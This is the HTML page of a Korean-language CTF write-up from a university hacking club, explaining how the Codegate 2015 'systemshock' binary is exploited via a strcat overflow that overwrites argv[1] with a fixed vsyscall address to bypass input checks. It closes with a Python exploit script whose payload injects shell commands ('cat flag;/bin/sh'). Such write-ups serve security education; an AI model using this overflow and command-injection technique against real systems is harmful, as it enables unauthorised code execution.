@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hexa-unist.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"remove","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다.  문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 shellshock인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ실제로 당황스럽게도 대회 서버에서 CVE-2014-6277이 먹혔더라죠… ;; 하지만 차분히 생각해보면 shellshock는 setuid가 걸려있는 바이너리안에서 b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Codegate 2015 - systemshock">
+<meta property="og:url" content="http://hexa-unist.github.io/2015/04/06/Codegate-2015-systemshock/index.html">
+<meta property="og:site_name" content="HeXA">
+<meta property="og:description" content="200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다.  문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 shellshock인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ실제로 당황스럽게도 대회 서버에서 CVE-2014-6277이 먹혔더라죠… ;; 하지만 차분히 생각해보면 shellshock는 setuid가 걸려있는 바이너리안에서 b">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock1.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock2.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock3.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock4.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock5.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock6.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock7.png">
+<meta property="og:image" content="http://hexa-unist.github.io/img/systemshock8.png">
+<meta property="article:published_time" content="2015-04-06T03:20:08.000Z">
+<meta property="article:modified_time" content="2024-12-31T03:10:03.427Z">
+<meta property="article:author" content="HeXA">
+<meta property="article:tag" content="l34p">
+<meta property="article:tag" content="codegate">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hexa-unist.github.io/img/systemshock1.png">
+
+
+<link rel="canonical" href="http://hexa-unist.github.io/2015/04/06/Codegate-2015-systemshock/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://hexa-unist.github.io/2015/04/06/Codegate-2015-systemshock/","path":"2015/04/06/Codegate-2015-systemshock/","title":"Codegate 2015 - systemshock"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Codegate 2015 - systemshock | HeXA</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">HeXA</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-circle-info fa-fw"></i>About</a></li><li class="menu-item menu-item-members"><a href="/members/" rel="section"><i class="fa fa-user fa-fw"></i>Members</a></li><li class="menu-item menu-item-seminar"><a href="/seminar/" rel="section"><i class="fa fa-microphone fa-fw"></i>Seminar</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://hexa-unist.github.io/2015/04/06/Codegate-2015-systemshock/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="HeXA">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HeXA">
+      <meta itemprop="description" content="UNIST Computer Club. Hacker's eXciting Academy">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Codegate 2015 - systemshock | HeXA">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Codegate 2015 - systemshock
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2015-04-06 12:20:08" itemprop="dateCreated datePublished" datetime="2015-04-06T12:20:08+09:00">2015-04-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-12-31 12:10:03" itemprop="dateModified" datetime="2024-12-31T12:10:03+09:00">2024-12-31</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>200점짜리 문제로, 많은 팀들이 가장먼저 푼 문제입니다. </p>
+<p>문제가 나오고 정말빨리 풀렸는데, 저는 처음에 문제 제목에 현혹되어 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">shellshock</a>인줄 알고 헤메느라 시간이 많이 걸렸네요… ㅠㅠ<br>실제로 당황스럽게도 대회 서버에서 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6277">CVE-2014-6277</a>이 먹혔더라죠… ;;</p>
+<p>하지만 차분히 생각해보면 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">shellshock</a>는 <code>setuid</code>가 걸려있는 바이너리안에서 <code>bash</code>를 호출해야한다는 점과 환경변수를 필요로 한다는점을 생각해보면 이 문제에서는 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">shellshock</a>를 사용할 수 없다는걸 바로 알 수 있습니다.</p>
+<p>이걸 생각못해서 날린 시간이 몇시간인지.. 흙흙</p>
+<p>여튼, 이 문제는 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">shellshock</a>를 이용해서 푸는 문제가 아닌 strcat을 이용한 단순한 오버플로우 문제입니다. 제대로 된 풀이만 바로 떠올리면 정말 빨리 풀 수 있는 문제이지요… 실제로 문제가 나오자마자 엄청 빠른 속도로 풀린 문제이기도 합니다.</p>
+<p>그럼 각설하고 풀이로 들어가보도록 하겠습니다!</p>
+<h2 id="문제환경"><a href="#문제환경" class="headerlink" title="문제환경"></a>문제환경</h2><p align="center"> <img src="/img/systemshock1.png" style="width: 90%;"/> </p>
+
+<p>오호 정확히 <code>strlen</code>의 인자로 넣어준 A들이 들어간것을 볼 수 있습니다.</p>
+<p>그럼 이제 해야할것은 <code>argv[1]</code>의 포인터를 덮어씌우기 위해 앞에 몇개의 A를 넣어줘야하는지와 어떤 값으로 덮어써야할지를 정하면 되겠습니다.</p>
+<p>어떤값으로 덮어써야할지는 비어있는 문자열 즉 null이 들어있는 주소로 덮어주면 됩니다. 그러면 <code>strlen</code>의 리턴값이 0이 되고, 입력값 검사를 우회할수 있게 됩니다. 그런데 여기서 또 생각해 줘야할 부분이 서버에는 ASLR이 걸려있어 주소들이 랜덤이고 32비트가 아니라 ulimit -s unlimited 같은 꼼수도 못부립니다 ㅠㅠ.. 하지만! 64비트에도 고정인 주소가 있으니… 바로 그부분은 vsyscall 영역입니다.</p>
+<p align="center"> <img src="/img/systemshock2.png" style="width: 80%;"/> </p>
+
+<p>끝부분에 보이는 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffff600000    0xffffffffff601000 r-xp      [vsyscall]</span><br></pre></td></tr></table></figure>
+
+<p>부분은 ASLR이 걸려있더라도 고정인 주소로 매핑됩니다. 그렇다면 이 vsyscall 영역에 null이 들어있는 주소가있다면?! 그 주소로 <code>strlen</code>의 인자, 즉 argv[1]의 포인터를 덮어씌우면 끝나게 됩니다.</p>
+<p>그러면 이제 이 vsyscall 영역에 null문자열이 있는지 한번 찾아봅시다.</p>
+<p align="center"> <img src="/img/systemshock3.png" style="width: 90%;"/> </p>
+
+<p>찾는방법은 여러가지 있겠으나 저는 peda의 searchmem 기능을 이용하여 찾았습니다.<br>vsyscall 영역에서 null(0x00) 으로 찾으니 꽤 많이 나오는데 이 중에서 값의 중간에 0x00 널값이 포함안되는 값으로 아무거나 하나 정해주면됩니다.</p>
+<p>null이 들어가면 안되는 이유는 문제 바이너리를 실행할때 인풋을 argv[1]로 넘겨주는데 이 argv[1]은 중간에 null값이 들어갈 수 없기 때문입니다. ( null 값이 들어가면 null뒤의 값들은 짤립니다.. ㅠㅠ )</p>
+<p>여튼 그럼 저는 적당히 0xffffffffff600405 로 골라서 하도록 하겠습니다.</p>
+<p>이제 남은일은 앞에 더미값인 A를 몇개나 입력해줘야하는가 인데, 자세히 분석해서 알아낼 수도 있겠지만 대회 특성상 문제를 빨리풀어야하는걸 고려해서 peda의 pattern 명령어를 사용하여 자세히 분석하지 않고도 쉽게 알아낼수 있는 방법을 쓰도록 하겠습니다.</p>
+<p align="center"> <img src="/img/systemshock4.png" style="width: 85%;"/> </p>
+
+<p>pattern create 1024 pattern.txt 를 입력하면 pattern.txt 라는 파일에 1024개의 패턴 문자가 쓰여지게 됩니다.<br>그리고 실행할때 r <code>cat pattern.txt</code> 로 실행을 하면 방금 만든 pattern 값들을 argv[1]로 넘기면서 실행할 수 있습니다.</p>
+<p>이렇게 실행을 하면,</p>
+<p align="center"> <img src="/img/systemshock5.png" style="width: 85%;"/> </p>
+
+<p>이렇게 <code>strlen</code>의 인자가 패턴값으로 덮힌것을 알 수 있습니다.</p>
+<p>이상태에서 pattern.txt 파일을 열어 ANsA8sAi 의 문자열을 찾아 ( 리틀엔디안이므로 문자열을 뒤집은 것입니다. ) 이 문자열앞의 문자 갯수를 python len 함수같은것을 이용하여 세어봐도 되고, peda의 pattern search 라는 기능을 이용해도 됩니다.</p>
+<p align="center"> <img src="/img/systemshock6.png" style="width: 85%;"/> </p>
+
+<p>pattern search를 해보면 offset이 525로 나오는데 이게 우리가 구할 offset과 일치합니다.</p>
+<p>이렇게 offset을 구했으니 “A” 525개 + “B” 8개 를 넣어서 offset이 맞는지 한번 확인해보도록 하겠습니다.</p>
+<p align="center"> <img src="/img/systemshock7.png" style="width: 90%;"/> </p>
+
+<p><code>strlen</code>에 breakpoint를 걸은후, <code>perl -e&#39;print&quot;A&quot;x525, &quot;B&quot;x8&#39;</code> 로 실행시키면 정확히 <code>strlen</code>의 인자로 BBBBBBBB가 들어가는것을 볼 수 있습니다.</p>
+<p>그럼 이제 BBBBBBBB 부분 대신에 아까 구해준 null이 들어있는 주소,  0xffffffffff600405 으로 대신 넣어주고 “A”525개에 A만 넣는게 아니라 실행시킬 명령어도 포함시켜 주면 입력값 검사를 안받게되고 임의의 명령어를 실행시킬수 있게 됩니다.</p>
+<h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="comment"># ./shock &quot;`cat payload`&quot;</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">null_addr=<span class="number">0xffffffffff600405</span></span><br><span class="line">cmd=<span class="string">&quot;HACKED;cat flag;/bin/sh;#&quot;</span></span><br><span class="line"></span><br><span class="line">payload = cmd + <span class="string">&quot;A&quot;</span>*(<span class="number">525</span>-<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+= pack(<span class="string">&quot;&lt;Q&quot;</span>, null_addr)</span><br><span class="line"></span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/systemshock8.png"></p>
+<p>궁금한부분이 있거나 수정할 부분이 있으면 언제든 말해주세요!</p>
+<p>작성자: <a target="_blank" rel="noopener" href="https://github.com/L34p/">l34p</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/l34p/" rel="tag"># l34p</a>
+              <a href="/tags/codegate/" rel="tag"># codegate</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2015/02/27/club-auto-system/" rel="prev" title="동아리 활동 내역서 자동 생성 사이트">
+                  <i class="fa fa-chevron-left"></i> 동아리 활동 내역서 자동 생성 사이트
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2015/08/04/XSS-subdomain-escape-wirte-up-on-Dropbox/" rel="next" title="XSS subdomain escape wirte up (on Dropbox)">
+                  XSS subdomain escape wirte up (on Dropbox) <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HeXA</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
